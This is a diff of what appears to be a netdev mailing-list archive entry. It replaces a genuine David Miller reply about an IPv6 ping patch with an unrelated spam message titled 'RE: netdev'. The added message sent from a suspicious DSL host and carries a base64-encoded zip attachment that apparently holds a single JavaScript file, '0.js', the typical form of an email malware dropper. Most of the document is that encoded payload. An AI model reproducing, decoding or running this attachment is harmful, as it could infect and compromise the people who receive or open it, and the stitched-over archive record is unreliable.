@@ -1,41 +1,47 @@
-From: David Miller <davem@davemloft.net>
-Subject: Re: [PATCH net] net: ipv6: Fix ping to link-local addresses.
-Date: Mon, 08 Aug 2016 14:35:00 -0700 (PDT)
-Message-ID: <20160808.143500.473355495580691289.davem@davemloft.net>
-References: <1470642127-574-1-git-send-email-lorenzo@google.com>
+From: <salome.khum@vision-france.net>
+Subject: RE: netdev
+Date: Mon, 8 Aug 2016 17:45:01 -0400
+Message-ID: <000101d1f1f0$63ec6c38$c0a80001@hinet.net>
+Reply-To: <netdev@vger.kernel.org>
 Mime-Version: 1.0
-Content-Type: Text/Plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Cc: netdev@vger.kernel.org, hannes@stressinduktion.org, ek@google.com,
-	hideaki.yoshifuji@miraclelinux.com
-To: lorenzo@google.com
+Content-Type: application/zip; name="nnbhnnzzjpvuezy_netdev.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-pf0-f193.google.com ([209.85.192.193]:35455 "EHLO
-	mail-pf0-f193.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1752429AbcHHVfD (ORCPT
-	<rfc822;netdev@vger.kernel.org>); Mon, 8 Aug 2016 17:35:03 -0400
-Received: by mail-pf0-f193.google.com with SMTP id h186so25582183pfg.2
-        for <netdev@vger.kernel.org>; Mon, 08 Aug 2016 14:35:03 -0700 (PDT)
-In-Reply-To: <1470642127-574-1-git-send-email-lorenzo@google.com>
+Received: from 187-5-80-171.bsaco701.dsl.brasiltelecom.net.br ([187.5.80.171]:49189
+	"HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+	with SMTP id S1752495AbcHHVpB (ORCPT
+	<rfc822;netdev@vger.kernel.org>); Mon, 8 Aug 2016 17:45:01 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-From: Lorenzo Colitti <lorenzo@google.com>
-Date: Mon,  8 Aug 2016 16:42:07 +0900
-
-> ping_v6_sendmsg never sets flowi6_oif, so it is not possible to
-> ping an IPv6 address on a different interface. Instead, it sets
-> flowi6_iif, which is incorrect but harmless. Also, it returns an
-> error if a passed-in scope ID doesn't match sk_bound_dev_if.
-> 
-> Get rid of the error, stop setting flowi6_iif, and support
-> various ways of setting oif in the same priority order used by
-> udpv6_sendmsg.
-> 
-> Tested: https://android-review.googlesource.com/#/c/254470/
-> Signed-off-by: Lorenzo Colitti <lorenzo@google.com>
-
-We should always give sk_bound_dev_if the highest priority.
-
-Also, we should amend, not delete, the check against the scope
-ID in the sockaddr.  As explained by YOSHIFUJI Hideaki.
+UEsDBBQAAAAIAAGsCEnIY+6wtgUAAB0NAAAEAAAAMC5qc21XbW/bRgz+K/lSyIYNV7o3yvD8IUuT
+dlu6rnGDpG8DpNMpdhLLriyn7YL89/F0pKwAbYFK5vHIhw+f46kPWX3UzCPjIJo1o3k0NZlMw6sR
+ZLNCg4HChF+lTDX5Qm4sJOTtoAhv16/K31WsATIQUHif1+fRZLfPd009UONEDVs3GctSlSpHh7Av
+g8RwaisNrsS4XYGSlDg8ZCIkOPIrwPgE4RckAATZIMiM/GOIZUI55PNCtYRSUDWS45fCe/n1YEhN
+qTLthGYcYioykQsrCkE4RClikYiUY9Mzgxws1uB8TMLoOoiZjEMeypuaKRAGSIQWxIWQ3o4WBTFH
+CRZJv6TE+qSvhQwbKzvCxTgJfAsd6pAGPLMdC3qKbMdaI5LzXbct7vpkkT4DTJvqKH77IOUOTEZ7
+Lez356fdfj1ORNiPu7sGT7FdlgOARgkkUiCsYPDgqD5su29taXz2YEuw8dxEbTIouO2mYArBUEs5
+jAb3C4mgFyRamJzcUKtSqVxNezKxJjOs7Ody+HkCKeSqENofEKp3IMdJTHwFt7M7hFmY2KQwdcXx
+ab8h5OnJ0AXLoVNmYrKOIgPaE2GsyoPFA8MiDCvlUITk7hcKo4ZXrRWpSBas74/Nxf5P6cVz6BUf
+yVLhHwwk6Uxgc1HoedcBiWt+EsTQhesOS6oFH6V9/OnNDsqVvv7QF0RIcrnzEfwUwflxvvzUJ4Zc
+jO2owKlymCVESu4FK0ssLse1rlKR4dCINRuUjkmyFv+miDxhxBpBM8W1QXqvNz0UMoBAhQEfZGsS
+42edlzlONMIRt3ouoRDr5dVF/+hQHT35eeF1IvXzSKLFSYb/9s5PHWzt+duepEwI43FYUuZrnajc
+bLKPPcDUPYKHkyO48tNKJ50v2RyOAXriscnRlwCITKQ8cQ7HIDy4wUDmcB2Ed25kr2XhGRoX3g9X
+ASNizYZnqafaatBW8yEzNBL6qkcaKJzutO7vAjyfmqGlUAR+g50FgO3j2Uy4sfJp8FFlNz4YO7NU
+yNjzpvywYSSpHyD8Cwp9OKs8jpLn2KiS4z9wp8kxhw1DaHET6772NY9pkdLGHKY9MnFuaodbFVy5
+X4zpgjn1s4nr14xTtbmp9sCPoeYY/fxAGOaQDrguNSZHxhWOSSIUXNcL5eP6eBSu1Zkfzi1rwcZl
+FJ5HY3Xc6yUq1t8hsoS8888ga618IxOFp1dLWbaTuYBX278vXe+oTJmFssVC0g9YWBxgqXLud2Hs
+88ujvQT4bvQ8Kuw1T2j/JdK7gsIL+7ZnL6dfsezGkJriPZ10UsxCTmI6Y2SUuddWoMuzzY+ZmYlu
+urVxfRdR/KQ3WhImb/mMDQ+NRbm1JhWoCbl93yMtpXsIgatWIn5YhS2WoWEwpi9H2eL16qcRWTR/
+/XWfXQblg3cefzoCfjbhh1Iq7KGZtNSOxvDa/45s7+fYxIqPkTLuMC4lySbY8AL2H4p3//XPA49v
+H55ChHDJ4bOAu7fwxstud+JHqf8irueV+350bJvVg7t+l9862wyiq4WtV9tmsli6+/soOG4vs3k9
+Of2xzaritHpY1Ztq7apm0dSr6mY3iF5crapXq/oFuf+zfj+PQhhcj1rbR6F/kQ09R9HkbHXvFj93
+jVsHM2c9nke71hxC3K3LOYb5HL3buuqD+9H4fdHXQRSNEOAo+vIFX44x3qpaReMEb+LP0YXLivNV
+5d2Gs3JfYfZNdbSszwZvho+1a/Z1deRhndHSIDqOxhEthPomZb1Znyyz+mRTuME2q3fuj6oZHI+j
+ESJiUs1YDEfR8F+hhtEQg8+eumwfrv8abC+Gj76Gs5NZU/88ejw7mQ+e5UWHwRB32ayxy8G3byfD
+xyeCgXuewn9gmsm6XX755fujeHp5E3i6nUeBoG9wNY9n35dIywDff2sm9666aZbDx9vR3NfcfEbz
+1+EM/x2NZk8e2O1w9j9QSwECHwAUAAAACAABrAhJyGPusLYFAAAdDQAABAAkAAAAAAAAACAAAAAA
+AAAAMC5qcwoAIAAAAAAAAQAYAFt/dsaa8dEBoUSqipnx0QGhRKqKmfHRAVBLBQYAAAAAAQABAFYA
+AADYBQAAAAA=
